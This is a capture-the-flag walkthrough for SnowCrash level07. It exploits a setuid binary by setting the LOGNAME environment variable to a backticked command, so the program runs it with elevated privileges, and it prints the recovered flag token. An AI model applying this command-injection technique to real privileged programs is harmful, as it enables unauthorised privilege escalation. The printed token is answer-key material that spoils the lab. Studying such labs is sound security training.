Level07 - Environment Variable Command Injection

OverviewThis level demonstrates exploitation of an executable that uses an environment variable in an unsafe manner. By modifying the LOGNAME environment variable, we can inject and execute arbitrary commands.

Solution Steps
Step 1: Enumerate and Test the Executable
List files in the directory:

```sh
level07@SnowCrash:~$ ls -l
```

**Output:**
```
total 12
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```

Key observation: The file has setuid/setgid bits set and is owned by flag07, meaning it runs with elevated privileges.
Execute the binary to observe its behavior:

```sh
level07@SnowCrash:~$ ./level07
level07
```

Step 2: Analyze the Binary
Use strings to extract readable text from the executable:

```sh
level07@SnowCrash:~$ strings level07
```

**Relevant findings:**
```sh
[...]
LOGNAME
/bin/echo %s
[...]
```

Analysis:

The program reads the LOGNAME environment variable
It passes this value to /bin/echo %s
The format string %s is replaced with the LOGNAME value
This is executed via a shell command

We have to change the value of the variable env LOGNAME then execute level07 file

```sh
level07@SnowCrash:~$ printenv | grep LOGNAME
LOGNAME=level07
level07@SnowCrash:~$ export LOGNAME=\`getflag\`
level07@SnowCrash:~$ printenv | grep LOGNAME
LOGNAME=`getflag`
level07@SnowCrash:~$ ./level07 
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
level07@SnowCrash:~$ su level08
Password:
level08@SnowCrash:~$
```

level07 passed !